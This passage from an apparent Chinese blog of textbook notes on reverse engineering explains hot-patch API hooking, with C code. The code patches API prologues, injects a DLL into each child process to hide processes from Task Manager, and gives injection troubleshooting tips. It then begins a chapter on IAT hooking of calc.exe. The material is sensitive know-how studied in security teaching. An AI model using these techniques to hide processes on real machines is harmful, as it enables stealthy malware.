title="33.11 源代码分析"></a>33.11 源代码分析</h1><p>下面分析stealth3.cpp源代码，内容大致与stealth2.cpp类似，主要看与实施“热补丁”技术相关的代码。</p><p><strong>stealth3.cpp</strong></p><p>hook_by_hotpatch()</p><p>首先5析hook_by_hotpatch()函数，它运用“热补丁”技术钩取API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">hook_by_hotpatch</span><span class="hljs-params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)</span><br>&#123;<br>FARPROC pFunc;<br>DWORD dwOldProtect, dwAddress;<br>BYTE pBuf[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xE9</span>, <span class="hljs-number">0</span>, &#125;;<br>    BYTE pBuf2[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xF9</span> &#125;;<br>PBYTE pByte;<br><br>pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);<br>pByte = (PBYTE)pFunc;<br><span class="hljs-keyword">if</span>( pByte[<span class="hljs-number">0</span>] == <span class="hljs-number">0xEB</span> )<br><span class="hljs-keyword">return</span> FALSE;<br><br>VirtualProtect((LPVOID)((DWORD)pFunc - <span class="hljs-number">5</span>), <span class="hljs-number">7</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br><br>    <span class="hljs-comment">// 1. NOP (0x90)</span><br>dwAddress = (DWORD)pfnNew - (DWORD)pFunc;<br><span class="hljs-built_in">memcpy</span>(&amp;pBuf[<span class="hljs-number">1</span>], &amp;dwAddress, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">memcpy</span>((LPVOID)((DWORD)pFunc - <span class="hljs-number">5</span>), pBuf, <span class="hljs-number">5</span>);<br>    <br>    <span class="hljs-comment">// 2. MOV EDI, EDI (0x8BFF)</span><br>    <span class="hljs-built_in">memcpy</span>(pFunc, pBuf2, <span class="hljs-number">2</span>);<br><br>VirtualProtect((LPVOID)((DWORD)pFunc - <span class="hljs-number">5</span>), <span class="hljs-number">7</span>, dwOldProtect, &amp;dwOldProtect);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用“热补丁”技术钩取API时，操作顺序非常重要。首先要将API起始地址上方的NOP*5指令修改为JMP XXXXXXXX。通过下面公式很容易求出XXXXXXXX值（即上述代码中的dwAddress变量），计算公式如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">dwAddress = (DWORD)pfnNew-(DWORD)pFunc;<br></code></pre></td></tr></table></figure><blockquote><p>上述公式与前面讲解hook_by_code()函数时介绍的地址计算公式实际是一样的。</p><p>XXXXXXXX &#x3D;要跳转的地址-当前指令地址-当前指令长度(5)</p><p>当前指令(NOP*5)地址&#x3D;pFunc-5,所以上述公式可做如下修改：</p><p>XXXXXXXX &#x3D; (DWORD)pfnNew - ((DWORD)pFunc - 5) -5</p><p>&#x3D;(DWORD)pfnNew - (DWORD)pFunc </p><p>*pfnNew &#x3D;用户钩取函数</p><p>*pFunc &#x3D;原 API 地址</p></blockquote><p>求得XXXXXXXX值后，使用下述代码将NOP *5指令（5个字节大小）替换为JMP XXXXXXXX指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(&amp;pBuf[<span class="hljs-number">1</span>], &amp;dwAddress, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">memcpy</span>((LPVOID)((DWORD)pFunc - <span class="hljs-number">5</span>), pBuf, <span class="hljs-number">5</span>);<br></code></pre></td></tr></table></figure><p>接下来，将位于API起始地址处的MOV EDI,EDI指令（2个字节大小）替换为JMP YY指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(pFunc, pBuf2, <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><blockquote><p>使用JMP YY指令时，要先计算出YY值，计算公式与前面相同。</p><p>YY&#x3D;要跳转的地址-当前指令地址-当前指令长度（2）</p><p>要跳转的地址是pFunc - 5,当前指令地址为pFunc, YY值计算如下：</p><p>YY &#x3D; （pFunc - 5）- pFunc - 2 &#x3D; -7 &#x3D;0xF9 </p><p>“热补丁”技术中，YY值总为0xF9,将其硬编码到源代码就可以了（0xF9是-7 的 “2的补码”形式）。</p></blockquote><p>unhook_by_hotpatch()</p><p>接下来分析unhook_by_hotpatch()函数，它在“热补丁”技术中用来取消API钩取操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">unhook_by_hotpatch</span><span class="hljs-params">(LPCSTR szDllName, LPCSTR szFuncName)</span><br>&#123;<br>    FARPROC pFunc;<br>    DWORD dwOldProtect;<br>    PBYTE pByte;<br>    BYTE pBuf[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span> &#125;;<br>    BYTE pBuf2[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xFF</span> &#125;;<br><br><br>    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);<br>    pByte = (PBYTE)pFunc;<br>    <span class="hljs-keyword">if</span>( pByte[<span class="hljs-number">0</span>] != <span class="hljs-number">0xEB</span> )<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    VirtualProtect((LPVOID)pFunc, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br><br>    <span class="hljs-comment">// 1. NOP (0x90)</span><br>    <span class="hljs-built_in">memcpy</span>((LPVOID)((DWORD)pFunc - <span class="hljs-number">5</span>), pBuf, <span class="hljs-number">5</span>);<br>    <br>    <span class="hljs-comment">// 2. MOV EDI, EDI (0x8BFF)</span><br>    <span class="hljs-built_in">memcpy</span>(pFunc, pBuf2, <span class="hljs-number">2</span>);<br><br>    VirtualProtect((LPVOID)pFunc, <span class="hljs-number">5</span>, dwOldProtect, &amp;dwOldProtect);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码用来将修改后的指令恢复为原来的NOP *5与<code>MOV EDI，EDI</code>指令。“热补丁”技术中这些指令都是固定不变的，所以可以将它们硬编码到源代码。</p><p>NewCreateProcessA()</p><p>下面分析用户钩取函数NewCreateProcessA()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">NewCreateProcessA</span><span class="hljs-params">(</span><br><span class="hljs-params">    LPCTSTR lpApplicationName,</span><br><span class="hljs-params">    LPTSTR lpCommandLine,</span><br><span class="hljs-params">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="hljs-params">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="hljs-params">    BOOL bInheritHandles,</span><br><span class="hljs-params">    DWORD dwCreationFlags,</span><br><span class="hljs-params">    LPVOID lpEnvironment,</span><br><span class="hljs-params">    LPCTSTR lpCurrentDirectory,</span><br><span class="hljs-params">    LPSTARTUPINFO lpStartupInfo,</span><br><span class="hljs-params">    LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="hljs-params">)</span><br>&#123;<br>    BOOL bRet;<br>    FARPROC pFunc;<br><br>    <span class="hljs-comment">// 调用原始API</span><br>    pFunc = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;CreateProcessA&quot;</span>);<br>    pFunc = (FARPROC)((DWORD)pFunc + <span class="hljs-number">2</span>);<br>    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,<br>                                     lpCommandLine,<br>                                     lpProcessAttributes,<br>                                     lpThreadAttributes,<br>                                     bInheritHandles,<br>                                     dwCreationFlags,<br>                                     lpEnvironment,<br>                                     lpCurrentDirectory,<br>                                     lpStartupInfo,<br>                                     lpProcessInformation);<br><br>    <span class="hljs-comment">// 向生成的子进程注入stealth3.dll</span><br>    <span class="hljs-keyword">if</span>( bRet )<br>        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);<br><br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上述代码中可以看到，不再调用unhook_by_code()与hook_by_code函数，且与已有函数根本的不同在于添加了计算pFunc的语句，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pFunc=(FARPROC)((DWORD)pFunc+<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>该代码语句用于跳过位于API起始地址处的JMP YY指令{ 2个字节，原指令为<code>MOV EDI,EDI</code>），从紧接的下一条指令开始执行，与调用原API的效果一样。</p><h1 id="33-12-使用“热补丁”-API钩取技术时需要考虑的问题"><a href="#33-12-使用“热补丁”-API钩取技术时需要考虑的问题" class="headerlink" title="33.12 使用“热补丁” API钩取技术时需要考虑的问题"></a>33.12 使用“热补丁” API钩取技术时需要考虑的问题</h1><p>令人遗憾的是，这么优越的“热补丁” API钩取技术也不是万能的，使用时目标API必须满足它的适用条件（NOP *5指令+<code>MOV EDI,EDI</code>指令），但是有些API却不能满足这些条件（参考图33-23、图33-24）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305222144911.png" alt="图33-23难以使用“热补丁” API钩取技术：kernel32.GetStartInfoA()"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305222334989.png" alt="图33-24 无法使用“热补丁” API钩取技术：ntdll.dll提供的API"></p><p>并非所有API都能使用“热补丁” API钩取技术，所以使用前先确认要钩取的API是否支持它。若不支持，则要使用前面介绍过的5字节代码修改技术。</p><blockquote><p>ntdll.dll中提供的API代码都较短，钩取这些API时有一种非常好的方法，使用这种方法时先将原API备份到用户内存区域，然后使用5字节代码修改技术修改原API的起始部分。在用户钩取函数内部调用原API时，只需调用备份的API即可，这样实 现的API钩取既简单又稳定。由于ntdll.dll API代码较短，且代码内部地址无依赖性，所以它们非常适合用该技术钩取API。</p></blockquote><h1 id="33-13-小结"><a href="#33-13-小结" class="headerlink" title="33.13 小结"></a>33.13 小结</h1><p>通过修改API代码钩取API技术的讲解到此结束。讲解技术的核心内容时用的篇幅较多。各位阅读学习时不要死记硬背，要把重点放在对技术原理的理解上。学完本章以及下一章要介绍的全局API钩取内容，就能够完全掌握API钩取技术。</p><p>Q.运行hideproc.exe程序0.5秒后自动终止，为什么会这样？ </p><p>A. hideproc.exe进程完成所有工作后会自动终止退出，程序就是这样编写的。若任务管理器中看不到notepad.exe进程，就表示执行成功。 </p><p>Q.执行HideProc.exe -hide abc.exe d:\stealth.dll命令，结果出现如下注入失败信息:<br>OpenProcess3976 failed!!! OpenProcess4040 failed!!!为什么注入会失败呢？ </p><p>A. Windows Vista&#x2F;7中使用了会话隔离技术，这可能导致DLL注入失败。出现这个问题时，不要使用kernel32.CreateRemoteThread()，而使用ntdll.NtCreateThreadEx()就可以了。相关内容请参考Session in Windows 7中的说明。有时开启杀毒软件自身的进程保护功能也会导致DLL注入失败。此外，尝试向PE32+格式的进程注入PE32格式的DLL时，也会失败（反之亦然）。注入时必须保证要注入的DLL文件与目标进程的PE格式一致（PE32+格式是Windows 64位OS使用的可执行文件格式）。</p><p>Q.要隐藏的进程在任务管理器的“进程”选项卡中消失了，但在“应用程序”选项卡中仍然可见，且程序窗口也依然可见。如何把程序窗口也一起隐藏起来呢？ </p><p>A.是的，若只在进程列表中实现了进程隐藏，则程序窗口仍然可见。若将程序窗口也一起隐藏起来，则在任务管理器的“应用程序”选项卡中也消失不见。正文示例的代码只是为了钩取API,对程序的窗口并未作任何处理（程序窗口确实存在，但是进程却消失不见了，我也有意让各位看看这个现象）。就像隐形战斗机，隐形并不是指用肉眼看不到它，而是仅指用雷达探测不到它。DLL文件注入目标进程后，只要调用与窗口隐藏相关的API即可轻松隐藏程序窗 口（SetWindowPos()，MoveWindow()等）。</p><p> Q.除了前面介绍过的5字节修改方法之外，还有其他钩取API的方法吗？在钩取函数中反复进行“脱钩” &#x2F;挂钩操作显得相当麻烦啊！ </p><p>A.我介绍的5字节修改方法适用范围较广，一般情况下也运行得非常好。除此之外，还有7字节修改方法，在钩取函数中也不需要进行“脱钩” &#x2F;挂钩操作。但并不适用于所有API, 特别是ntdll.dll提供的原生（native） API就无法使用7字节修改技术。关于7字节“热补丁”技术的内容请参看前面正文。此外还有一种方法是，将API代码全部拷贝到其他地方，但是这需要处理好重定位的问题（该方法非常适用于ntdll的原生API,因为这些API的代码都比较简短）。总之，从应用范围以及简便性方面考虑，5字节修改技术是首选。 </p><p>Q.使用全局钩取技术注入dll文件时会不会给系统带来很大负担呢？所有进程在创建的时候都要注入dll,那么内存使用量会大幅飙升吧？ </p><p>A.首先，任何钩取操作都会给系统带来一定负担。编写程序时若能巧妙运用一些手法，则可以将这种对系统的影响降到最低，不会有什么问题，但一定要充分考虑好系统稳定性与资源利用问题。向所有进程注入DLL时，内存使用量也会随之增加，但并不是以“DLL尺寸*注入进程的个数增加。Windows中，相同DLL只要加载到内存中1次即可，进程通过映射技术使用它。简言之，通过映射技术将代码映射到相同内存，即代码区对所有进程都是一样的，而数据区则要根据相应进程重新创建。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第33章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第32章 计算器显示中文数字</title>
    <link href="/1999/03/02/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/"/>
    <url>/1999/03/02/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/</url>
    
    <content type="html"><![CDATA[<p>第32章计算器显示中文数字<br>API钩取技术中有一种是通过注入DLL文件来钩取某个API的，DLL文件注入目标进程后，修 改IAT来更改进程中调用的特定API的功能。</p><p>本章讲解API钩取技术时将以Windows计算器（calc.exe）为示例，向计算器进程插入用户的DLL文件，钩取IAT的user32.SetWindowTextW() API地址。负责向计算器显示文本的SetWindowTextW() API被钩取之后，计算器中显示出的将是中文数字，而不是原来的阿拉伯数字。</p><h1 id="32-1-技术图表"><a href="#32-1-技术图表" class="headerlink" title="32.1 技术图表"></a>32.1 技术图表</h1><p>图32-1的API钩取技术图表中，带有下划线的部分就是“通过DLL注入实现IAT钩取的技术”。这项技术的优点是工作原理与具体实现都比较简单（只需先将要钩取的API在用户的DLL中重定 义，然后再注入目标进程即可）；缺点是，如果想钩取的API不在目标进程的IAT中，那么就无法使用该技术进行钩取操作。换言之，如果要钩取的API是由程序代码动态加载DLL文件而得以使用的，那么我们将无法使用这项技术钩取它。</p><h1 id="32-2-选定目标API"><a href="#32-2-选定目标API" class="headerlink" title="32.2 选定目标API"></a>32.2 选定目标API</h1><p>确定了任务目标，并且选择了要使用的API钩取技术后，接下来的重要一步是选定目标API，即要钩取的API。初学者往往不知所措，因为他们不知道究竟哪个API提供了要钩取的那个功能。操作系统中，某项功能最终都是由某个或某些API提供的，比如创建文件由kernel32!CreateFile()API负责，创建注册表新键advapi32!RegCreateKeyEx() API负责，网络连接由ws2_32!connect()API等负责。对拥有丰富开发经验或逆向技术知识的人来说，他们能够很容易地想起需要的API。而对于尚未掌握这部分知识的人而言，要知道答案必须先学会检索。如果要钩取尚未公开的API（undocumented API）,就必须学会使用检索功能。若搜索不到，可以先根据已有经验（或直觉）推测，然后再验证确认。</p><p>选定API前要先明确任务目标。本章示例的目标是“把计算器的文本显示框中显示的阿拉伯数字更改为中文数字”。首先，使用010Editor工具查看计算器（calc.exe）中导入的API，如图32-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226154749071.png" alt="图32-2 calc.exe的IAT"></p><p>图32-2中有2个API引人注目，分别为SetWindowTextW()、SetDlgItemTextW(),它们负责向计算器的文本显示框中显示文本。由于SetDlgItemTextW()在其内部又调用了SetWindowTextW()，所以我们先假设只要钩取SetWindowTextW()这1个API就可以了。SetWindowTextW() API定义（出处：MSDN）如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">SetWindowText</span><span class="hljs-params">(</span><br><span class="hljs-params">    HWND hWnd,</span><br><span class="hljs-params">     <span class="hljs-comment">// handle of window or control</span></span><br><span class="hljs-params">    LPCTSTR lpString</span><br><span class="hljs-params">     <span class="hljs-comment">// address of string</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>它拥有2个参数，第一个参数为窗口句柄（hWnd）,第二个参数为字符串指针（IpString）。其 中，我们感兴趣的是第二个参数—字符串指针（IpString）。钩取时查看字符串（IpString）中的内容，将其中的阿拉伯数字更改为中文数字就行了。</p><blockquote><p>API名称中最后面的“W”表示该API是宽字符（Wide character）版本。与之对应，若API名称最后面的字符为“A”，则表示该API是ASCII码字符（ASCII character）版本。Windows OS内部使用的宽字符指的就是Unicode码。 如：SetWindowTextA(）、SetWindowTextW()</p></blockquote><p>下面使用OllyDbg验证上面的猜测是否正确。</p><blockquote><p>示例中使用的是Windows 7（32位）中的 calc.exe， Windows Vista、 Windows XP SP3 （32位）中的calc.exe工作原理也是一样的。</p></blockquote><p>如图32-3所示，使用鼠标右键菜单的Search for All intermodular calls命令，查找计算器（calc.exe）代码中调用SetWindowTextW() API的部分。然后在所有调用它的地方设置断点，运行计算器（calc.exe），调试器在设置断点的地方暂停，如图32-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226162153646.png" alt="图32-3 calc.exe内部调用的SetWindowTextW() API与断点设置"></p><p>在图32-4中查看栈窗口，可以看到SetWindowTextW() API的IpString参数的值为22C9CF0（OllyDbg中指出它是一个“Text”）。进入22C9CF0地址，可以看到字符串 “0.” 被保存为Unicode码 形式。该字符串就是显示在计算器显示框中的初始值，继续运行。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226163804514.png" alt="图32-4 在SetWindowTextW()的断点处暂停"></p><p>如图32-5所示，计算器（calc.exe）正常运行后，显示框中显示图32-4中的字符串 “0.”（是计算器自动添加的字符串）。为了继续调试，在计算器中随意输入数字7。由于前面已经设置了断点，所以调试器会在设置的断点处暂停，如图32-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226165203181.png" alt="图32-6 在SetWindowTextW()的断点处暂停"></p><p>如图32-6所示，保存在Text参数中的字符串地址为22C9CD8,与图32-4中的22C9CF0不同。进入22C9CD8地址，可以看到输入的字符串 “7.”（末尾的是由计算器自动添加的字符串）。下面尝试把阿拉伯数字 “7” 更改为中文数字“七”，测试一下。请注意：中文数字“七”对应的Unicode码为4e03。</p><blockquote><p>Unicode码中每个汉字占用2个字节。</p></blockquote><p>如图32-7所示，将中文数字“七”的Unicode码（4e03）覆写到22C9CD8地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226164952180.png" alt="图32-7 更改为中文数字“七”"></p><p>由于X86系列的CPU采用小端序标记法，所以覆写时要逆序（034e）进行。如上所示，修改了SetWindowTextW()API的IpString （或Text）参数内容后，继续运行计算器，可以看到原本显示在计算器中的阿拉伯数字 “7” 变为了中文数字“七”，如图32-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226164834121.png" alt="图32-8 变为中文数字“七”"></p><p>对SetWindowTextW() API的验证到此结束，验证结果表明我们前面的猜测完全正确。经过上述过程，我们知道了代码中调用SetWindowTextW() API的位置（01003678），并且确定了一个事实：只要修改参数字符串中的内容，就能修改计算器中显示的格式。下面继续学习IAT钩取操作及实现原理，并讲解计算器SetWindowTextW() API的IAT钩取源代码。</p><h1 id="32-3-IAT钩取工作原理"><a href="#32-3-IAT钩取工作原理" class="headerlink" title="32.3 IAT钩取工作原理"></a>32.3 IAT钩取工作原理</h1><p>进程的IAT中保存着程序中调用的API的地址。</p><blockquote><p>有关IAT的说明请参考第13章。</p></blockquote><p>IAT钩取通过修改IAT中保存的API地址来钩取某个API。请先看图32-9。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226170025241.png" alt="图32-9 正常调用SetWindowsTextW() API的程序执行流"></p><p>图32-9描述的是计算器（calc.exe）进程正常调用user32.SetWindowTextW() API的情形。地址01001110属于IAT区域，程序开始运行时，PE装载器会将user32.SetWindowTextW() API地址（77D0960E）记录到该地址（01001110）。01002628地址处的CALL DWORD PTR [01001110]指令最终会调用保存在01001110地址（77D0960E）处的函数，直接等同于CALL 77D0960E命令。</p><p>执行地址01002628处的CALL命令后，运行将转移至user32.SetWindowTextW()函数的起始地址（77D0960E）处（①），函数执行完毕后返回（②）。</p><p>下面看看IAT被钩取后计算器进程的运行过程，如图32-10所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220226170147461.png" alt="图32-10 IAT被钩取后SetWindowTextW()的调用流程"></p><p>钩取IAT前，首先向计算器进程（calc.exe）注入hookiat.dll文件</p><blockquote><p>关于DLL注入的讲解请参考第23章。</p></blockquote><p>hookiat.dll文件中提供了名为MySetWindowTextW()的钩取函数（10001000）。地址01002628处的CALL命令与图32-9中的CALL命令完全一致。但是跟踪进入01001110地址中可以发现，它的值已经变为10001000，地址10001000是hookiat.MySetWindowTextW()函数的起始地址。也就是说，在保持运行代码不变的前提下，将IAT中保存的API起始地址变为用户函数的起始地址。这就是IAT钩取的基本工作原理。</p><p>执行完01002628地址处的CALL命令后，运行转到hookiat.MySetWindowTextW()函数的起始地址（10001000）（①），经过一系列处理后，执行1000107D地址处的CALL命令，转到（原来要调用的）user32.SetWindowTextW()函数的起始地址（②）。</p><blockquote><p>地址1000B6B8位于hookiat.dll的data节区，它是全局变量g_pOrgFunc的地址。注入DLL时，DllMain()会获取并保存user32.SetWindowTextW()函数的起始地址。</p></blockquote><p>user32.SetWindowTextW() API执行完毕后，执行会返回到hookiat.dll的1000107D地址的下一条指令（③），然后返回到01002628地址（calc.exe的代码区域）的下一条指令继续执行（④）。也就是说，程序调用user32.SetWindowTextW() API之前，会先调用hookiat.MySetWindowTextW()函数。像这样，先向目标进程（calc.exe）注入用户DLL （hookiat.dll）,然后在calc.exe进程的IAT区域中更改4个字节大小的地址，就可以轻松钩取指定API （这种通过修改IAT来钩取API的技术 也称为IAT钩取技术）。希望各位先理解上面讲解的IAT钩取工作原理，再跟着做后面的练习示例。</p><h1 id="32-4-练习示例"><a href="#32-4-练习示例" class="headerlink" title="32.4 练习示例"></a>32.4 练习示例</h1><p>本练习示例的目标是在计算器的显示框中用中文数字代替原来的阿拉伯数字。为达成目标，本节中我们将使用前面讲过的“通过修改IAT来实现API钩取的技术”。</p><blockquote><p>hookiat.dll 与 InjectDll.exe 文件均使用 VC++ Express Edition 编写而成，并在 Windows XP SP3、Windows 7 （32位）中通过测试。</p></blockquote><p>首先复制示例文件到工作目录（c:\work），然后运行计算器（calc.exe）程序，再使用Process Explorer查看计算器进程的PID值，如图32-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227105951440.png" alt="图32-11 calc.exe的PID"></p><p>在命令行窗口中输入图32-12中的命令，按Enter键执行。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227110223756.png" alt="图32-12 向calc.exe注人hookiat.dll文件"></p><blockquote><p>这里在进行实验时发现通过命令行不能注进去，可以通过VS注进去，在C盘根目录下依旧不行，原因未知。</p></blockquote><p>可以在Process Explorer中看到hookiat.dll文件已经成功注入calc.exe，如图32-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227111253122.png" alt="图32-13 注入calc.exe进程的hookiat.dll"></p><p>接下来在计算器中任意输入一些数字并计算，如图32-14所示。</p><p><img 